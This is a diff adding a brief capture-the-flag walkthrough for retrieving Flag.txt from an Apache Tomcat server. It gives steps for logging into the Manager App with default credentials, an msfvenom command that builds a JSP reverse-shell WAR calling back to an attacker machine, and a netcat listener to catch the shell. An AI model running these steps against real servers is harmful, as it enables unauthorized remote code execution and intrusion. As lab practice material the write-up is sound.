@@ -1,0 +1,16 @@
+website: hrms.breakthecode.com:8080
+
+task: Flag.txt
+
+procedure: 
+1. No much clue from teh scanning but it runs apache-tomcat.
+2. go to ip:8080 to see tomcat  
+3. go to Manager App
+4. try default username and passwords 
+5. login 
+6. there is war file deploy option 
+7. try creating a war vulnerable payload using msfvenom 
+8. msfvenom -p java/jsp_shell_reverse_tcp LHOST=<kaliip> LPORT=4444 -f war > payload.war
+9. upload it to the apache tomcat 
+10. nc -nlvp 4444
+11. open file on the website. 
